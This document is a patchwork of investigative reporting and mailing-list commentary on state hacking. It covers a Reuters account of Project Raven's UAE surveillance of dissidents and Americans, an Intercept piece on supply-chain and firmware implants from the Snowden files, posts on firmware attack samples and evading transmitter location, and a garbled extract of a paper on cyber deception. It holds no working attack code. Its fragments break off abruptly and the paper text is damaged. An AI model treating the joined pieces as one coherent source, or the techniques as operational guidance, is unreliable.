Providing sensitive defense technologies or services to a foreign government generally requires special licenses from the U.S. State and Commerce Departments. Both agencies declined to comment on whether they issued such licenses to CyberPoint for its operations in the UAE. They added that human rights considerations figure into any such approvals.
But a 2014 State Department agreement with CyberPoint showed Washington understood the contractors were helping launch cyber surveillance operations for the UAE. The approval document explains CyberPoint’s contract is to work alongside NESA in the “protection of UAE sovereignty” through “collection of information from communications systems inside and outside the UAE” and “surveillance analysis.”
One section of the State Department approval states CyberPoint must receive specific approval from the NSA before giving any presentations pertaining to “computer network exploitation or attack.” Reuters identified dozens of such presentations Raven gave to NESA describing attacks against Donaghy, Mansoor and others. It’s unclear whether the NSA approved Raven’s operations against specific targets.
The agreement clearly forbade CyberPoint employees from targeting American citizens or companies. As part of the agreement, CyberPoint promised that its own staff and even Emirati personnel supporting the program “will not be used to Exploit U.S. Persons, (i.e. U.S. citizens, permanent resident aliens, or U.S. companies.)” Sharing classified U.S. information, controlled military technology, or the intelligence collection methods of U.S. agencies was also prohibited.
Gumtow declined to discuss the specifics of the agreement. “To the best of my ability and to the best of my knowledge, we did everything as requested when it came to U.S. rules and regulations,” he said. “And we provided a mechanism for people to come to me if they thought that something that was done was wrong.”
An NSA spokesman declined to comment on Project Raven.
A State Department spokesman declined to comment on the agreement but said such licenses do not authorize people to engage in human rights abuses.
By late 2015, some Raven operatives said their missions became more audacious.
For instance, instead of being asked to hack into individual users of an Islamist Internet forum, as before, the American contractors were called on to create computer viruses that would infect every person visiting a flagged site. Such wholesale collection efforts risked sweeping in the communications of American citizens, stepping over a line the operators knew well from their NSA days.
U.S. law generally forbids the NSA, CIA and other U.S. intelligence agencies from monitoring U.S. citizens.
Working together with managers, Stroud helped create a policy for what to do when Raven swept up personal data belonging to Americans. The former NSA employees were instructed to mark that material for deletion. Other Raven operatives would also be notified so the American victims could be removed from future collection.
As time went on, Stroud noticed American data flagged for removal show up again and again in Raven’s NESA-controlled data stores.
Still, she found the work exhilarating. “It was incredible because there weren’t these limitations like there was at the NSA. There wasn’t that bullshit red tape,” she said. “I feel like we did a lot of good work on counterterrorism.”
DARKMATTER AND DEPARTURES
When Raven was created in 2009, Abu Dhabi had little cyber expertise. The original idea was for Americans to develop and run the program for five to 10 years until Emirati intelligence officers were skilled enough to take over, documents show. By 2013, the American contingent at Raven numbered between a dozen and 20 members at any time, accounting for the majority of the staff.
In late 2015, the power dynamic at the Villa shifted as the UAE grew more uncomfortable with a core national security program being controlled by foreigners, former staff said. Emirati defense officials told Gumtow they wanted Project Raven to be run through a domestic company, named DarkMatter.
Slideshow (12 Images)
Raven’s American creators were given two options: Join DarkMatter or go home.
At least eight operatives left Raven during this transition period. Some said they left after feeling unsettled about the vague explanations Raven managers provided when pressed on potential surveillance against other Americans.
DarkMatter was founded in 2014 by Faisal Al Bannai, who also created Axiom, one of the largest sellers of mobile devices in the region. DarkMatter markets itself as an innovative developer of defensive cyber technology. A 2016 Intercept article reported the company assisted UAE’s security forces in surveillance efforts and was attempting to recruit foreign cyber experts.
The Emirati company of more than 650 employees publicly acknowledges its close business relationship to the UAE government, but denies involvement in state-backed hacking efforts.
Project Raven’s true purpose was kept secret from most executives at DarkMatter, former operatives said.
DarkMatter did not respond to requests for comment. Al Bannai and the company’s current chief executive, Karim Sabbagh, did not respond to interview requests. A spokeswoman for the UAE Ministry of Foreign Affairs declined to comment.
Under DarkMatter, Project Raven continued to operate in Abu Dhabi from the Villa, but pressure escalated for the program to become more aggressive.
Before long, senior NESA officers were given more control over daily functions, former Raven operatives said, often leaving American managers out of the loop. By mid-2016, the Emirates had begun making an increasing number of sections of Raven hidden from the Americans still managing day-to-day operations. Soon, an “Emirate-eyes only” designation appeared for some hacking targets.
FBI QUESTIONS
By 2016, FBI agents began approaching DarkMatter employees reentering the United States to ask about Project Raven, three former operatives said.
The FBI wanted to know: Had they been asked to spy on Americans? Did classified information on U.S. intelligence collection techniques and technologies end up in the hands of the Emiratis?
Two agents approached Stroud in 2016 at Virginia’s Dulles airport as she was returning to the UAE after a trip home. Stroud, afraid she might be under surveillance by the UAE herself, said she brushed off the FBI investigators. “I’m not telling you guys jack,” she recounted.
Stroud had been promoted and given even more access to internal Raven databases the previous year. A lead analyst, her job was to probe the accounts of potential Raven targets and learn what vulnerabilities could be used to penetrate their email or messaging systems.
Targets were listed in various categories, by country. Yemeni targets were in the “brown category,” for example. Iran was gray.
One morning in spring 2017, after she finished her own list of targets, Stroud said she began working on a backlog of other assignments intended for a NESA officer. She noticed that a passport page of an American was in the system. When Stroud emailed supervisors to complain, she was told the data had been collected by mistake and would be deleted, according to an email reviewed by Reuters.
Concerned, Stroud began searching a targeting request list usually limited to Raven’s Emirati staff, which she was still able to access because of her role as lead analyst. She saw that security forces had sought surveillance against two other Americans.
When she questioned the apparent targeting of Americans, she received a rebuke from an Emirati colleague for accessing the targeting list, the emails show. The target requests she viewed were to be processed by “certain people. You are not one of them,” the Emirati officer wrote.
Days later, Stroud said she came upon three more American names on the hidden targeting queue.
Those names were in a category she hadn’t seen before: the “white category” — for Americans. This time, she said, the occupations were listed: journalist.
“I was sick to my stomach,” she said. “It kind of hit me at that macro level realizing there was a whole category for U.S. persons on this program.”
Once more, she said she turned to manager Baier. He attempted to downplay the concern and asked her to drop the issue, she said. But he also indicated that any targeting of Americans was supposed to be done by Raven’s Emirate staff, said Stroud and two other people familiar with the discussion.
Stroud’s account of the incidents was confirmed by four other former employees and emails reviewed by Reuters.
When Stroud kept raising questions, she said, she was put on leave by superiors, her phones and passport were taken, and she was escorted from the building. Stroud said it all happened so quickly she was unable to recall the names of the three U.S. journalists or other Americans she came across in the files. “I felt like one of those national security targets,” she said. “I’m stuck in the country, I’m being surveilled, I can’t leave.”
After two months, Stroud was allowed to return to America. Soon after, she fished out the business card of the FBI agents who had confronted her at the airport.
“I don’t think Americans should be doing this to other Americans,” she told Reuters. “I’m a spy, I get that. I’m an intelligence officer, but I’m not a bad one.”

Another update:
“Michel Lambert” is a pseudonym and the Paris company he claimed to represent does not exist. The New York Times, in collaboration with Uvda, an investigative television show on Israel’s Channel 12, has confirmed that the mysterious visitor was Aharon Almog-Assoulin, a retired Israeli security official who until recently served on the town council in a suburb of Tel Aviv.
The phenomenon of private spies drew widespread attention in 2017, when Black Cube, an Israeli private intelligence firm, was found to have used undercover agents to approach women who had accused Harvey Weinstein, the Hollywood producer, of sexual misconduct. Black Cube later was identified as having sent agents, again under false cover, to investigate Obama administration officials who had worked on the Iran nuclear deal.
Black Cube denied that it had played any role in approaching Citizen Lab employees, but the same undercover agent turned up in an earlier case in Canada with a Black Cube connection.

some things to note about the samples:
- the L1 image uses BIOS recovery to trigger actual exploit payload on unaddressable storage; that is to say it does not store the loader / malware directly on SPI flash memory. NSA has been adept at avoiding trivial detection via this route for a long time...
- the L2 image is a configuration permanent denial of service. this is designed to disrupt target activities, rather than perform any traditional exploitation or exfiltration. with an impossible boot configuration, the system appears "dead".
these techniques are the opposite of the Sednit approach where the malware resides as an UEFI module with malicious code stored on SPI flash memory.  this makes it easy to detect (if you happen to catch it! :) as per the talk linked originally best regards,

the problem with a singular transmitter is still the trivial location determination - you want to make that last hop hard to find.
previous discussions have suggested MIMO for beam forming / phased array signal emission that lets you do fancy things, like emulate a moving transmitter.  if the transmitter appears to be constantly moving, it's a much harder target :)
these systems used to be millions of dollars, and now they are merely thousands. (soon enough only hundreds of $?)
this is getting into canonical zero knowledge protocols, albeit adapted for wireless mesh networks. if you search the literature for "zero knowledge wireless sensor network" you'll find a long tangle of research to devour in this domain...
one benefit of actual broadcast receivers is the ability to distribute a large amount of information to all simultaneously. in some protocols this can be a big advantage. Tor directory information for example, could be broadcast over digital video bands and then partitioning attacks against directory obviated.
bitcoin had discussed doing this for blockchain distribution in Norway, IIRC.

@_subject: Deception in Information Security 
deception is becoming all the rage these days. done right, it provides a unique window into attacker intention and capability.
rather than the isolated, fabricated structures commonly used (honey-*) consider instrumenting your actual systems with traps for the nefarious:
- set browser strings showing out of date, vulnerable versions
- leave packages old, but replace with source built updates
- instrument applications with sanitizers and hardened allocators
- jail and container, to observe unexpected calls
exploits, like any other software, are fragile! slight changes in build and configuration can render even the most expensive and carefully constructed chain impotent.
some things will get through (think: logic bugs, rather than technical exploitation) so keep your most sensitive work on truly hardened systems with strong compartmentalization and attack surface reduction. (yes, Qubes is still better than a vanilla distro! it's amazing how much malware simply aborts when it finds itself in a virtualized environment. feature, not bug! :)

Cyber Security DeceptionMohammed H. Almeshekah and Eugene H. Spafford
Abstract Our physical and digital worlds are converging at a rapid pace, putting
a lot of our valuable information in digital formats. Currently, most computer
systems’ predictable responses provide attackers with valuable information on how
to infiltrate them. In this chapter, we discuss how the use of deception can play a
prominent role in enhancing the security of current computer systems. We show
how deceptive techniques have been used in many successful computer breaches.
Phishing, social engineering, and drive-by-downloads are some prime examples.
We discuss why deception has only been used haphazardly in computer security.
Additionally, we discuss some of the unique advantages deception-based security
mechanisms bring to computer security. Finally, we present a framework where
deception can be planned and integrated into computer defenses.1 IntroductionMost data is digitized and stored in organizations’ servers, making them a valuable
target. Advanced persistent threats (APT), corporate espionage, and other forms of
attacks are continuously increasing. Companies reported 142 million unsuccessful
attacks in the first half of 2013, as reported by Fortinet [[1]( In addition, a recent
Verizon Data Breach Investigation Report (DBIR) points out that currently deployed
protection mechanisms are not adequate to address current threats [[1]( The report
states that 66 % of the breaches took months or years to discover, rising from 56 %
in 2012. Furthermore, 84% of these attacks only took hours or less to infiltrate
computer systems [[1]( Moreover, the report states that only 5 % of these breaches
were detected using traditional intrusion detection systems (IDSs) while 69 % were
detected by external parties [[1](
These numbers are only discussing attacks that were discovered. Because only
5 % of the attacks are discovered using traditional security tools, it is likely that theM.H. Almeshekah ( )

Everybody Does It: The Messy Truth About Infiltrating Computer Supply Chains
[Micah Lee]( [Henrik Moltke](
January 24 2019, 6:55 p.m.
In October, Bloomberg Businessweek published an alarming [story]( Operatives working for China’s People’s Liberation Army had secretly implanted microchips into motherboards made in China and sold by U.S.-based Supermicro. This allegedly gave Chinese spies clandestine access to servers belonging to over 30 American companies, including Apple, Amazon, and various government suppliers, in an operation known as a “supply chain attack,” in which malicious hardware or software is inserted into products before they are shipped to surveillance targets.
Bloomberg’s report, based on 17 anonymous sources, including “six current and former senior national security officials,” began to crumble soon after publication as key parties issued swift and unequivocal denials. Apple [said]( that “there is no truth” to the claim that it discovered malicious chips in its servers. Amazon [said]( the Bloomberg report had “so many inaccuracies … as it relates to Amazon that they’re hard to count.” Supermicro [stated]( it never heard from customers about any malicious chips or found any, including in an audit it [hired]( another company to conduct. Spokespeople for the Department of Homeland Security and the U.K.’s National Cyber Security Centre [said]( they saw no reason to doubt the companies’ denials. Two named sources in the story have publicly stated that they’re skeptical of its conclusions.
But while Bloomberg’s story may well be completely (or partly) wrong, the danger of China compromising hardware supply chains is very real, judging from classified intelligence documents. U.S. spy agencies were warned about the threat in stark terms nearly a decade ago and even assessed that China was adept at corrupting the software bundled closest to a computer’s hardware at the factory, threatening some of the U.S. government’s most sensitive machines, according to documents provided by National Security Agency whistleblower Edward Snowden. The documents also detail how the U.S. and its allies have themselves systematically targeted and subverted tech supply chains, with the NSA conducting its own such operations, including in China, in partnership with the CIA and other intelligence agencies. The documents also disclose supply chain operations by German and French intelligence.
What’s clear is that supply chain attacks are a well-established, if underappreciated, method of surveillance — and much work remains to be done to secure computing devices from this type of compromise.
“An increasing number of actors are seeking the capability to target … supply chains and other components of the U.S. information infrastructure,” the intelligence community stated in a secret 2009 report. “Intelligence reporting provides only limited information on efforts to compromise supply chains, in large part because we do not have the access or technology in place necessary for reliable detection of such operations.”
Nicholas Weaver, a security researcher of the International Computer Science Institute, affiliated with the University of California, Berkeley, told The Intercept, “The Bloomberg/SuperMicro story was so disturbing because an attack as described would have worked, even if at this point we can safely conclude that the Bloomberg story itself is bovine excrement. And now if I’m China, I’d be thinking, ‘I’m doing the time, might as well do the crime!’”
While the Bloomberg story painted a dramatic picture, the one that emerges from the Snowden documents is fragmented and incomplete — but grounded in the deep intelligence resources available to the U.S. government. This story is an attempt to summarize what that material has to say about supply chain attacks, from undisclosed documents we’re publishing for the first time today, documents that have been published already, and documents that have been published only in part or with little to no editorial commentary. The documents we draw on were written between 2007 and 2013; supply chain vulnerabilities have apparently been a problem for a long time.
None of the material reflects directly on Bloomberg Businessweek’s specific claims. The publication has not commented on the controversy around its reporting beyond this statement: “Bloomberg Businessweek’s investigation is the result of more than a year of reporting, during which we conducted more than 100 interviews. Seventeen individual sources, including government officials and insiders at the companies, confirmed the manipulation of hardware and other elements of the attacks. We also published three companies’ full statements, as well as a statement from China’s Ministry of Foreign Affairs. We stand by our story and are confident in our reporting and sources.”

U.S. “Critical Infrastructure” Is Vulnerable to Supply Chain Attacks
The U.S. government as a general matter takes seriously the possibility of supply chain tampering, and of China in particular conducting such meddling, including during manufacturing, according to government documents.
A classified 2011 Department of Defense “[Strategy for Operating in Cyberspace]( refers to supply chain vulnerabilities as one of the “central aspects of the cyber threat,” adding that the U.S.’s reliance on foreign factories and suppliers “provides broad opportunities for foreign actors to subvert and interdict U.S. supply chains at points of design, manufacture, service, distribution, and disposal.”
Chinese hardware providers could position themselves in U.S. industry to compromise “critical infrastructure upon which DoD depends,” according to the document.
Another classified document, a [2009 National Intelligence Estimate]( about “The Global Cyber Threat to the US Information Infrastructure,” assessed with “high confidence” that there was an increased “potential for persistent, stealthy subversions” in technology supply chains due to globalization and with “moderate confidence” that this would occur in part by tampering with manufacturing and by “taking advantage of insiders.” Such “resource-intensive tactics” would be adopted, the document claimed, to counter additional security on classified U.S. networks.
Each National Intelligence Estimate focuses on a particular issue and represents the collective judgment of all U.S. intelligence agencies, as distilled by the director of national intelligence. The 2009 NIE singled out China and Russia as “the greatest cyber threats” to the U.S. and its allies, saying that Russia had the ability to conduct supply chain operations and that China was conducting “insider access, close access, remote access, and probably supply chain operations.” In a section devoted to “Outside Reviewers’ Comments,” one such reviewer, a former executive at a maker of communications hardware, suggested that the intelligence community look more closely at the Chinese supply chain. The reviewer added:
The NIE even flagged supply chain attacks as a threat to the integrity of electronic voting machines, since the machines are “subject to many of the same vulnerabilities as other computers,” although it noted that, at the time in 2009, U.S. intelligence was not aware of any attempts “to use cyber attacks to affect U.S. elections.”
Beyond mostly vague concerns involving Russia and China, the U.S. intelligence community did not know what to make of the vulnerability of computer supply chains. Conducting such attacks was “difficult and resource-intensive,” according to the NIE, but beyond that, it had little information to understand the scope of the problem: “The unwillingness of victims and investigating agencies to report incidents” and the lack of technology to detect tampering meant that “considerable uncertainty overshadows our assessment of the threat posed by supply chain operations,” the NIE said.
A section within the 2011 Department of Defense Strategy for Operating in Cyberspace is devoted to the risk of supply chain attacks. This section describes a strategy to “manage and mitigate the risk of untrustworthy technology used by the telecommunications sector,” in part by bolstering U.S. manufacturing, to be fully operational by 2016, two years after Bloomberg said the Supermicro supply chain attack occurred. It’s not clear if the strategy ever became operational; the Defense Department, which [published]( an unclassified version of the same document, did not respond to a request for comment. But the 2009 NIE said that “exclusion of foreign software and hardware from sensitive networks and applications is already extremely difficult” and that even if an exclusion policy were successful “opportunities for subversion will still exist through front companies in the United States and adversary use of insider access in US companies.”
A third document, a [page]( on “Supply Chain Cyber Threats” from Intellipedia, an internal wiki for the U.S. intelligence community, included classified passages echoing similar worries about supply chains. A snapshot of the page from 2012 included a section, attributed to the CIA, saying that “the specter of computer hardware subversion causing weapons to fail in times of crisis, or secretly corrupting crucial data, is a growing concern. Computer chips are increasingly complex and subtle modifications made in design or manufacturing processes could be made impossible to detect with the practical means currently available.” Another passage, attributed to the Defense Intelligence Agency, flagged application servers, routers, and switches as among the hardware likely “vulnerable to the global supply chain threat” and added that “supply chain concerns will be exacerbated as U.S. providers of cybersecurity products and services are acquired by foreign firms.”
A 2012 snapshot of a different [Intellipedia page]( listed supply chain attacks first among threats to so-called air-gapped computers, which are kept isolated from the internet and are used by spy agencies to handle particularly sensitive information. The document also said that Russia “has experience with supply chain operations” and stated that “Russian software companies have set up offices in the United States, possibly to deflect attention from their Russian origins and to be more acceptable to U.S. government purchasing agents.” (Similar [concerns]( over Russian antivirus software firm Kaspersky Lab led to a recent [ban on]( the use of Kaspersky software within the U.S. government.) Kaspersky Lab has repeatedly denied that it has ties to any government and said it would not help a government with cyber espionage. Kaspersky is even [reported]( to have helped expose former NSA contractor Harold T. Martin III, who was charged with large-scale theft of classified data from the NSA.

Chinese Telecom Firm Seen as Threat
Beyond broad worries, the U.S. intelligence community had some specific concerns about China’s ability to use the supply chain for espionage.
The 2011 Defense Department strategy document said, without elaborating, that Chinese telecommunications equipment providers suspected of ties to the People’s Liberation Army “pursue inroads into the U.S. telecommunications infrastructure.”
This may be a reference, at least in part, to Huawei, the Chinese telecommunications giant that the department feared would create backdoors in equipment sold to U.S. communications providers. The NSA went as far as to hack into Huawei’s corporate communications, looking for links between the company and the People’s Liberation Army, as reported jointly [by the New York Times]( and the German news magazine Der Spiegel. The report cited no evidence linking Huawei to the People’s Liberation Army, and a spokesperson from the company told the publications it was ironic that “they are doing to us is what they have always charged that the Chinese are doing through us.”
The U.S. intelligence community appeared concerned that Huawei might help the Chinese government tap into a sensitive transatlantic telecommunications cable known as “TAT-14,” according to a [top-secret NSA briefing on Huawei]( The cable carried defense industry communication on a segment between New Jersey and Denmark; a 2008 upgrade was contracted to Mitsubishi, which “subcontracted the work Out to Huawei. Who in turn upgraded the system with a High End router of their own,” as the document put it. As a broader concern, the document added that there were indications the Chinese government might use Huawei’s “market penetration for its own SIGINT purposes” — that is, for signals intelligence. A Huawei spokesperson did not comment in time for publication.
Firmware Attacks Worry U.S. Intelligence
In other documents, spy agencies flagged another specific concern, China’s growing prowess at exploiting the BIOS, or the Basic Input/Output System. The BIOS, which is also known by the acronyms EFI and UEFI, is the first code that gets executed when a computer is powered on before launching an operating system like Windows, macOS, or Linux. The software that makes up the BIOS is stored on a chip on the computer’s motherboard, not on the hard drive; it is often referred to as “firmware” because it is tied so closely to the hardware. Like any software, the BIOS can be modified to be malicious and is a particularly good target for computer attacks because it resides outside the operating system and thus, cannot be easily detected. It is not even affected when a user erases the hard drive or installs a fresh operating system.
The Defense Intelligence Agency believed that China’s capability at exploiting the BIOS “reflects a qualitative leap forward in exploitation that is difficult to detect,” according to the “BIOS Implants” section in the [Intellipedia article]( on threats to air-gapped computers. The section further stated that “recent reporting,” presumably involving BIOS implants, “corroborates the tentative view in a 2008 national intelligence estimate that China is capable of intrusions more sophisticated than those currently observed by U.S. network defenders.”
A 2012 snapshot of another Intellipedia page, on “[BIOS Threats]( flags the BIOS’s vulnerability to supply chain meddling and insider threats. Significantly, the document also appears to refer to the U.S. intelligence community’s discovery of BIOS malware from China’s People’s Liberation Army, stating that “PLA and [[Russian]( MAKERSMARK versions do not appear to have a common link beyond the interest in developing more persistent and stealthy” forms of hacking. The “versions” mentioned appear to be instances of malicious BIOS firmware from both countries, judging from footnotes and other context in the document.
The Intellipedia page also contained indications that China may have figured out a way to compromise the BIOS software that’s manufactured by two companies, American Megatrends, commonly known as AMI, and Phoenix Technologies, which makes Award BIOS chips.
In a paragraph marked top secret, the page stated, “Among currently compromised are AMI and Award based BIOS versions. The threat that BIOS implants pose increases significantly for systems running on compromised versions.” After these two sentences, concluding the paragraph, is a footnote to a top-secret document, which The Intercept has not seen, titled “Probable Contractor to PRC People’s Liberation Army Conducts Computer Network Exploitation Against Taiwan Critical Infrastructure Networks; Develops Network Attack Capabilities.”
The word “compromised” could have different meanings in this context and does not necessarily indicate that a successful Chinese attack occurred; it could simply mean that specific versions of AMI and Phoenix’s Award BIOS software contained vulnerabilities that U.S. spies knew about. “It’s very puzzling that we haven’t seen evidence of more firmware attacks,” said Trammell Hudson, a security researcher at the hedge fund Two Sigma Investments and co-discoverer of a series of BIOS vulnerabilities in MacBooks [known]( as [Thunderstrike]( “Most every security conference debuts several new vulnerability proof-of-concepts, but … the only public disclosure of compromised firmware in the wild” came in 2015, when Kaspersky Lab announced the discovery of malicious hard drive firmware from an [advanced hacking operation]( dubbed Equation Group. “Either as an industry we’re not very good at detecting them, or these firmware attacks and hardware implants are only used in very tailored access operations.”
Hudson added, “It is quite worrisome that many systems never receive firmware updates after they ship, and the numerous embedded devices in a system are even less likely to receive updates. Any compromises against the older versions have a ‘forever day’ aspect that means that they will remain useful for adversaries against systems that might be in use for many years.”
American Megatrends issued the following statement: “The BIOS firmware industry, and computing as a whole, has taken incredible steps towards security since 2012. The information in the Snowden document concerns platforms that pre-date current BIOS-level security. We have processes in place to identify security vulnerabilities in boot firmware and promptly provide the mitigation to our OEM and ODM customers for their platforms.”
Phoenix Technologies issued the following statement: “The attacks described in the document are well-understood in the industry. Award BIOS was superseded by today’s more secure UEFI framework which contained mitigations for these types of firmware attacks many years ago.”
Successful Supply Chain Attacks by France, Germany, and the U.S.
The Snowden documents reviewed so far discuss, in often vague and uncertain terms, what U.S. intelligence believes its adversaries like China and Russia are capable of. But these documents and others also discuss in much more specific terms what the U.S. and its allies are capable of, including descriptions of specific, successful supply chain operations. They also describe in broad strokes the capabilities of various NSA programs and units against supply chains.
The Intellipedia page on [threats to air-gapped networks]( disclosed that as of 2005, Germany’s foreign intelligence agency, the BND, “has established a few commercial front companies that it would use to gain supply chain access to unidentified computer components.” The page attributes this knowledge to “information obtained during an official liaison exchange.” The page did not mention who BND’s target was or what sorts of activities the front companies were engaged in.
BND has been “setting up front companies for both HUMINT and SIGINT operations since the 1950s,” said Erich Schmidt-Eenboom, German author and BND expert, using the jargon terms for intelligence gathered both by human spies and through electronic eavesdropping, respectively. “As a rule, a full-time BND employee will found a small GmbH [company], which is responsible for a single operation. In the SIGINT area, this GmbH also maintains contacts with industrial partners.”
BND did not respond to a request for comment.
The Intellipedia page also stated that, beginning in 2002, France’s intelligence agency, DGSE, “delivered computers and fax equipment to Senegal’s security services and by 2004 could access all the information processed by these systems, according to a cooperative source with indirect access.” Senegal is a former French colony. Representatives of the Senegalese government did not respond to a request for comment. DGSE declined to comment.

Much of what’s been reported about the U.S.’s supply chain attack capabilities came from a June 2010 NSA document that The Intercept’s co-founder Glenn Greenwald published with his 2014 book “No Place to Hide.” The document, an article from an internal NSA news site called SIDtoday, was [published again]( in 2015 in Der Spiegel with fewer redactions (but without any new analysis).
SIDtoday concisely explained one NSA approach to supply chain attacks (formatting is from the original article):
Supply chain “interdiction” attacks like this involve compromising computer hardware while it’s being transported to the customer. They target a different part of the supply chain than the attack described by Bloomberg; Bloomberg’s story said Chinese spies installed malicious microchips into server motherboards while they were being manufactured at the factory, rather than while they were in transit. The NSA document said its interdiction attacks “are some of the most productive operations in TAO,” or Tailored Access Operations, NSA’s offensive hacking unit, “because they pre-position access points into hard target networks around the world.” (TAO is known today as Computer Network Operations.)
Interdicting specific shipments may carry less risk for a spy agency than implanting malicious microchips en masse at factories. “A design/manufacturing attack of the sort alleged by Bloomberg is plausible,” Eva Galperin, director of cybersecurity at the Electronic Frontier Foundation, told The Intercept. “That’s exactly why the story was such a big deal. But just because it’s plausible doesn’t mean it’s happened, and Bloomberg just didn’t bring in enough evidence, in my opinion, to support their claim.” She added, “What we do know is that a design/manufacturing attack is highly risky for the attacker and that there are many less risky alternatives that are better suited to the task at hand.”

The 2010 document also described a successful NSA attack against the state-run Syrian Telecommunications Establishment. The NSA knew the company had ordered computer network devices for its internet backbone, so the agency interdicted these devices and redirected them to a “load station,” where the agency implanted “beacons” and then placed the devices back into transit.
Several months after Syrian Telecom received the devices, one of the beacons “called back to the NSA covert infrastructure.” At that point, the NSA used its implant to survey the network where the device was installed and discovered that the device gave much greater access than expected; in addition to the internet backbone, it provided access into the national cellular network operated by Syrian Telecom, since the cellular traffic traversed the backbone.
“Since the STE GSM [cellular] network has never been exploited, this new access represented a real coup,” the author of the NSA document wrote. This allowed the NSA to “automatically exfiltrate” information about Syria Telecom cellular subscribers, including who they called, when, and their geographical locations as they carried their phones throughout the day. It also enabled the NSA to gain further access to cellular networks in the region.
Document: NSA
Another NSA document describes a different successful attack conducted by the agency. A slide from a 2013 NSA “program management review” described a [top-secret supply chain operation]( targeting a Voice-Over-IP network for classified online phone calls. At an “overseas location,” the NSA intercepted an order of equipment for this network from a manufacturer in China and compromised it with implant beacons.
“The analysis and reporting on this target identified, with high granularity, [the target’s] method of hardware procurement,” stated a presentation slide. “As a result of these efforts, NSA and its [Intelligence Community] partners are now positioned for success with future opportunities.”
NSA Operations in “Adversary Space”
In addition to information about specific supply chain operations by the U.S. and its allies, Snowden documents also include more general information about U.S. capabilities.
Computer hardware can be altered at various points along the supply chain, from design to manufacturing to storage to shipment. The U.S. is among the small number of countries that could, in theory, compromise devices at many different points in this pipeline, thanks to its resources and geographic reach.
Document: NSA
This was underlined in a [top-secret 2011 presentation]( about the Special Collection Service, a joint NSA/CIA spying program operating out of U.S. diplomatic facilities overseas. It referred to 80 global SCS sites as “points of presence” providing a “home field advantage in [the] adversary’s space,” from which “human enabled SIGINT,” can be conducted, and where supply chain “opportunities” present themselves, a suggestion that the NSA and CIA conduct supply chain attacks from U.S. embassies and consulates around the world. (The presentation was [published]( by Der Spiegel in 2014, alongside 52 other documents, and apparently never written about. The Intercept is republishing it to include the speaker notes.)
One program that goes after computer supply chains in this manner is the NSA’s SENTRY OSPREY, in which the agency uses human spies to bug digital intelligence sources, or, as the top-secret [briefing]( published by [The Intercept in 2014]( puts it, “employs its own HUMINT assets […] to support SIGINT operations,” including “close access” operations that essentially put humans right up against physical infrastructure. These operations, conducted in conjunction with partners like the CIA, FBI, and Defense Intelligence Agency, appear to have included attempts to implant bugs and compromise supply chains; a [2012 classification guide]( said they included “supply chain-enabling” and “hardware implant-enabling” — as well as “forward-based [program] presence” at sites in Beijing, as well as South Korea and Germany, all home to telecommunications manufacturers. Another program, SENTRY OWL, works “with specific foreign partners… and foreign commercial industry entities” to make devices and products “exploitable for SIGINT,” according to the briefing.
The Persistence Division
The NSA’s Tailored Access Operations played a critical role in the U.S. government’s supply chain interdiction operations. In addition to helping intercept shipments of computer hardware to secretly install hardware implants, one division of TAO, known as the “Persistence Division,” was tasked with actually creating the implants.
Document: NSA
A 2007 [top-secret presentation]( about TAO described “sophisticated” covert hacking of software, including firmware, over a computer network “or by physical interdiction,” and credits these attacks with providing U.S. spy agencies “some of their most significant successes.”
Another [document]( a 2007 NSA wiki page titled “Intern Projects,” first[published]( by Der Spiegel, described “ideas about possible future projects for the Persistence Division.” The projects described involved adding new capabilities to the NSA’s existing malicious firmware-based implants. These implants could be inserted into target computers via supply chain attacks.
One potential project proposed to expand a type of BIOS malware to work with computers running the Linux operating system and to offer more ways to exploit Windows computers.
Another suggested targeting so-called virtualization technology on computer processors, which allows the processors to more efficiently and reliably segregate so-called virtual machines, software to simulate multiple computers on a single computer. The proposed project would develop a “hypervisor implant,” indicating that it intended to target the software that coordinates the operation of virtual machines, known as the hypervisor. Hypervisors and virtual machines are used widely by cloud hosting providers. The implant would leverage support for virtual machines in both Intel and AMD processors. (Intel and AMD did not respond to requests for comment.)
Another possible project envisioned attaching a short hop radio to a hard drive’s serial port and communicating with it using a firmware implant. Yet another aimed to develop firmware implants targeting hard drives built by U.S. data storage company Seagate. (Seagate did not respond to a request for comment.)

Where to Hide Your Hardware Implant?
One of the reasons spy agencies like the NSA fear supply chain compromise is that there are so many places on a typical computer to hide a spy implant.
“Servers today have dozens of components with firmware and hundreds of active components,” said Joe FitzPatrick, a hardware security trainer and researcher. “The only way to give it a truly clean bill of health is in-depth destructive testing that depends on a ‘gold standard’ good reference to compare to — except defining that ‘gold standard’ is difficult to impossible. The much greater risk is that even perfect hardware can have vulnerable firmware and software.”
The [Intellipedia page about supply chain threats]( lists and analyzes the various pieces of hardware where a computer could be compromised, including power supplies (“could be set to … self-destruct, damage the computer’s motherboard … or even start a fire or explosion”); network cards (“well-positioned to plant malware and exfiltrate information”); disk controllers (“Better than a root kit”); and the graphics processing unit, or GPU (“well positioned to scan the computer’s screen for sensitive information”).
According to the Bloomberg report, Chinese spies connected their malicious microchip to baseboard management controllers, or BMCs, miniature computers that are hooked into servers to give administrators remote access to troubleshoot or reboot the servers.
FitzPatrick, quoted by Bloomberg, is skeptical of the Supermicro story, [including]( its description of how spies exploited the BMCs. But experts agreed that placing a backdoor into the BMC would be a good way to compromise a server. In a [follow-up story]( Bloomberg alleged that a “major U.S. telecommunications company” discovered a Supermicro server with an implant built into the Ethernet network card, which is one of the pieces of hardware listed in the Intellipedia page that’s vulnerable to supply chain attacks. FitzPatrick was, again, [skeptical]( of the claims.

After the Bloomberg story was published, in a [blog post]( on Lawfare, Weaver, the Berkeley security researcher, argued that the U.S. government should reduce the number of “components that need to execute with integrity” to only the central processing unit, or CPU, and require that that these “trusted base” components used in government systems be manufactured in the U.S., and by U.S. companies. In this way, the rest of the computer could be safely manufactured in China — systems would work securely even if components outside the trusted base, such as the motherboard, carried malicious implants. Apple’s iPhone and Intel’s Boot Guard, he argued, already work in this way. Due to the government’s purchasing power, “it should be plausible to write supply rules that, after a couple years, effectively require that U.S. government systems are built in a way that resists most supply chain attacks,” he told The Intercept.
While supply chain operations are used in real cyberattacks, they seem to be rare compared to more traditional forms of hacking, like spear-phishing and malware attacks over the internet. The NSA uses them to access “isolated or complex networks,” according to a 2007 top-secret presentation about TAO.
“Supply chain attacks are something individuals, companies, and governments need to be aware of. The potential risk needs to be weighed against other factors,” FitzPatrick said. “The reality is that most organizations have plenty of vulnerabilities that don’t require supply chain attacks to exploit.”

Special Report: Inside the UAE’s secret hacking team of U.S. mercenaries
[Christopher Bing]( [Joel Schectman](
